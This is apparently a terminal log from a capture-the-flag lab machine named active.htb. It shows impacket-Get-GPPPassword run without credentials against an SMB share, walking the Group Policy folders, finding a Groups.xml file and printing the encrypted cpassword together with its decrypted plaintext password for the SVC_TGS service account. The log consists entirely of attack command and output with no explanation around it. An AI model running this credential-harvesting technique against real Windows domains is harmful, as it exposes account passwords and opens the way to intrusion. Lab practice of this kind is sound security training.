```sh
└─$ impacket-Get-GPPPassword -share Replication -ts -debug -no-pass '@10.129.113.163'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-24 08:05:11] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-24 08:05:12] [+] SMBv2.1 dialect used
[2025-09-24 08:05:13] [+] USER Session Granted
[2025-09-24 08:05:13] [*] Listing shares...
  - ADMIN$
  - C$
  - IPC$
  - NETLOGON
  - Replication
  - SYSVOL
  - Users

[2025-09-24 08:05:14] [*] Searching *.xml files...
[2025-09-24 08:05:14] [+] Searching in // 
[2025-09-24 08:05:16] [+] Found directory active.htb/
[2025-09-24 08:05:16] [+] Next iteration with 1 folders.
[2025-09-24 08:05:16] [+] Searching in //active.htb/ 
[2025-09-24 08:05:18] [+] Found directory DfsrPrivate/
[2025-09-24 08:05:18] [+] Found directory Policies/
[2025-09-24 08:05:18] [+] Found directory scripts/
[2025-09-24 08:05:18] [+] Next iteration with 3 folders.
[2025-09-24 08:05:18] [+] Searching in //active.htb/DfsrPrivate/ 
[2025-09-24 08:05:20] [+] Found directory ConflictAndDeleted/
[2025-09-24 08:05:20] [+] Found directory Deleted/
[2025-09-24 08:05:20] [+] Found directory Installing/
[2025-09-24 08:05:20] [+] Searching in //active.htb/Policies/ 
[2025-09-24 08:05:21] [+] Found directory {31B2F340-016D-11D2-945F-00C04FB984F9}/
[2025-09-24 08:05:21] [+] Found directory {6AC1786C-016F-11D2-945F-00C04fB984F9}/
[2025-09-24 08:05:21] [+] Searching in //active.htb/scripts/ 
[2025-09-24 08:05:23] [+] Next iteration with 5 folders.
[2025-09-24 08:05:23] [+] Searching in //active.htb/DfsrPrivate/ConflictAndDeleted/ 
[2025-09-24 08:05:25] [+] Searching in //active.htb/DfsrPrivate/Deleted/ 
[2025-09-24 08:05:26] [+] Searching in //active.htb/DfsrPrivate/Installing/ 
[2025-09-24 08:05:28] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/ 
[2025-09-24 08:05:30] [+] Found file GPT.INI
[2025-09-24 08:05:30] [+] Found directory Group Policy/
[2025-09-24 08:05:30] [+] Found directory MACHINE/
[2025-09-24 08:05:30] [+] Found directory USER/
[2025-09-24 08:05:30] [+] Searching in //active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/ 
[2025-09-24 08:05:31] [+] Found file GPT.INI
[2025-09-24 08:05:31] [+] Found directory MACHINE/
[2025-09-24 08:05:31] [+] Found directory USER/
[2025-09-24 08:05:31] [+] Next iteration with 5 folders.
[2025-09-24 08:05:31] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/ 
[2025-09-24 08:05:33] [+] Found file GPE.INI
[2025-09-24 08:05:33] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/ 
[2025-09-24 08:05:35] [+] Found directory Microsoft/
[2025-09-24 08:05:35] [+] Found directory Preferences/
[2025-09-24 08:05:35] [+] Found file Registry.pol
[2025-09-24 08:05:35] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/ 
[2025-09-24 08:05:36] [+] Searching in //active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/ 
[2025-09-24 08:05:38] [+] Found directory Microsoft/
[2025-09-24 08:05:38] [+] Searching in //active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/ 
[2025-09-24 08:05:40] [+] Next iteration with 3 folders.
[2025-09-24 08:05:40] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/ 
[2025-09-24 08:05:42] [+] Found directory Windows NT/
[2025-09-24 08:05:42] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ 
[2025-09-24 08:05:43] [+] Found directory Groups/
[2025-09-24 08:05:43] [+] Searching in //active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/ 
[2025-09-24 08:05:45] [+] Found directory Windows NT/
[2025-09-24 08:05:45] [+] Next iteration with 3 folders.
[2025-09-24 08:05:45] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/ 
[2025-09-24 08:05:47] [+] Found directory SecEdit/
[2025-09-24 08:05:47] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/ 
[2025-09-24 08:05:49] [+] Found matching file //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
[2025-09-24 08:05:51] [+] Encoding detection: utf_8 is most likely the one.
[2025-09-24 08:05:51] [+] <?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
[2025-09-24 08:05:51] [*] Found a Groups XML file:
[2025-09-24 08:05:51] [*]   file      : \\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
[2025-09-24 08:05:51] [*]   newName   : 
[2025-09-24 08:05:51] [*]   userName  : active.htb\SVC_TGS
[2025-09-24 08:05:51] [*]   password  : GPPstillStandingStrong2k18
[2025-09-24 08:05:51] [*]   changed   : 2018-07-18 20:46:06

[2025-09-24 08:05:51] [+] Searching in //active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/ 
[2025-09-24 08:05:52] [+] Found directory SecEdit/
[2025-09-24 08:05:52] [+] Next iteration with 2 folders.
[2025-09-24 08:05:52] [+] Searching in //active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/ 
[2025-09-24 08:05:54] [+] Found file GptTmpl.inf
[2025-09-24 08:05:54] [+] Searching in //active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/ 
[2025-09-24 08:05:56] [+] Found file GptTmpl.inf
[2025-09-24 08:05:56] [+] Next iteration with 0 folders.
```
